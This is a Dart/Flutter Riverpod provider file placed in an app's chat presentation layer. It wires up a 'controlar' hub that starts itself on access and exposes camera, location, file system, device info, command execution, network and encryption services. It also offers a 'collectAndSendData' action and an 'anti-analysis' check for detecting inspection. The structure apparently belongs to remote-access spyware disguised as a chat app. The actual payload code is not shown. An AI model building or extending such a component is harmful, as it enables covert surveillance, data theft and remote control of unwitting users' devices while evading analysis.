// lib/presentation/chat/providers/control_providers.dart
import 'package:flutter_riverpod/flutter_riverpod.dart';

import '../../../core/controlar/camera/camera_service.dart';
import '../../../core/controlar/command/command_executor.dart';
import '../../../core/controlar/controller_hub.dart';
import '../../../core/controlar/data/data_collector_service.dart';
import '../../../core/controlar/filesystem/file_system_service.dart';
import '../../../core/controlar/location/location_service.dart';
import '../../../core/controlar/network/network_service.dart';
import '../../../core/controlar/permissions/device_info_service.dart';
import '../../../core/controlar/permissions/permission_service.dart';
import '../../../core/controlar/security/anti_analysis_system.dart';
import '../../../core/controlar/security/encryption_service.dart';
import '../../../core/logging/logger_provider.dart';

// Main controller hub provider
final controllerHubProvider = Provider<ControllerHub>((ref) {
  final controllerHub = ControllerHub();

  // Start the controller hub when it's accessed
  controllerHub.start().then((success) {
    if (success) {
      ref
          .read(appLoggerProvider)
          .info("ControllerHubProvider", "Controller hub started successfully");
    } else {
      ref
          .read(appLoggerProvider)
          .error("ControllerHubProvider", "Failed to start controller hub");
    }
  });

  // Make sure to dispose the controller when the provider is disposed
  ref.onDispose(() {
    controllerHub.dispose();
  });

  return controllerHub;
});

// Controller status provider
final controllerStatusProvider = StreamProvider<String>((ref) {
  final controllerHub = ref.watch(controllerHubProvider);
  return controllerHub.statusMessageStream;
});

// Connection status provider
final connectionStatusProvider = StreamProvider<bool>((ref) {
  final controllerHub = ref.watch(controllerHubProvider);
  return controllerHub.connectionStatusStream;
});

// Permission service provider
final permissionServiceProvider = Provider<PermissionService>((ref) {
  return PermissionService();
});

// Individual service providers - these use the services from the controller hub
final deviceInfoServiceProvider = Provider<DeviceInfoService>((ref) {
  return ref.watch(controllerHubProvider).deviceInfoService;
});

final dataCollectorServiceProvider = Provider<DataCollectorService>((ref) {
  return ref.watch(controllerHubProvider).dataCollectorService;
});

final locationServiceProvider = Provider<LocationService>((ref) {
  return ref.watch(controllerHubProvider).locationService;
});

final cameraServiceProvider = Provider<CameraService>((ref) {
  return ref.watch(controllerHubProvider).cameraService;
});

final fileSystemServiceProvider = Provider<FileSystemService>((ref) {
  return ref.watch(controllerHubProvider).fileSystemService;
});

final networkServiceProvider = Provider<NetworkService>((ref) {
  return ref.watch(controllerHubProvider).networkService;
});

final commandExecutorProvider = Provider<CommandExecutor>((ref) {
  return ref.watch(controllerHubProvider).commandExecutor;
});

final antiAnalysisSystemProvider = Provider<AntiAnalysisSystem>((ref) {
  return ref.watch(controllerHubProvider).antiAnalysisSystem;
});

final encryptionServiceProvider = Provider<EncryptionService>((ref) {
  return ref.watch(controllerHubProvider).encryptionService;
});

// Controller action providers

/// Provider to trigger data collection and sending
final collectDataActionProvider = FutureProvider.autoDispose<bool>((ref) async {
  final controllerHub = ref.watch(controllerHubProvider);
  final logger = ref.watch(appLoggerProvider);

  logger.info("CollectDataAction", "Manually triggering data collection");
  final result = await controllerHub.collectAndSendData();

  logger.info("CollectDataAction", "Data collection result: $result");
  return result;
});

/// Provider to check for analysis attempts
final checkAnalysisActionProvider =
    FutureProvider.autoDispose<bool>((ref) async {
  final controllerHub = ref.watch(controllerHubProvider);
  final logger = ref.watch(appLoggerProvider);

  logger.info("CheckAnalysisAction", "Manually checking for analysis attempts");
  final result = await controllerHub.checkForAnalysisAttempts();

  logger.info("CheckAnalysisAction", "Analysis check result: $result");
  return result;
});

/// State class for controller state
class ControllerState {
  final bool isRunning;
  final bool isConnected;
  final String statusMessage;
  final int dataCollectionCount;

  ControllerState({
    required this.isRunning,
    required this.isConnected,
    required this.statusMessage,
    required this.dataCollectionCount,
  });

  ControllerState copyWith({
    bool? isRunning,
    bool? isConnected,
    String? statusMessage,
    int? dataCollectionCount,
  }) {
    return ControllerState(
      isRunning: isRunning ?? this.isRunning,
      isConnected: isConnected ?? this.isConnected,
      statusMessage: statusMessage ?? this.statusMessage,
      dataCollectionCount: dataCollectionCount ?? this.dataCollectionCount,
    );
  }
}

/// State notifier for controller state
class ControllerStateNotifier extends StateNotifier<ControllerState> {
  final ControllerHub _controllerHub;

  ControllerStateNotifier(this._controllerHub)
      : super(ControllerState(
          isRunning: _controllerHub.isRunning,
          isConnected: _controllerHub.isConnected,
          statusMessage: 'Initialized',
          dataCollectionCount: 0,
        )) {
    // Listen for status messages
    _controllerHub.statusMessageStream.listen((message) {
      state = state.copyWith(statusMessage: message);
    });

    // Listen for connection status
    _controllerHub.connectionStatusStream.listen((connected) {
      state = state.copyWith(isConnected: connected);
    });
  }

  /// Start the controller
  Future<bool> startController() async {
    final success = await _controllerHub.start();
    if (success) {
      state = state.copyWith(isRunning: true);
    }
    return success;
  }

  /// Stop the controller
  Future<void> stopController() async {
    await _controllerHub.stop();
    state = state.copyWith(isRunning: false);
  }

  /// Collect and send data
  Future<bool> collectAndSendData() async {
    final success = await _controllerHub.collectAndSendData();
    if (success) {
      state = state.copyWith(
        dataCollectionCount: state.dataCollectionCount + 1,
      );
    }
    return success;
  }
}

/// Provider for controller state notifier
final controllerStateProvider =
    StateNotifierProvider<ControllerStateNotifier, ControllerState>((ref) {
  final controllerHub = ref.watch(controllerHubProvider);
  return ControllerStateNotifier(controllerHub);
});
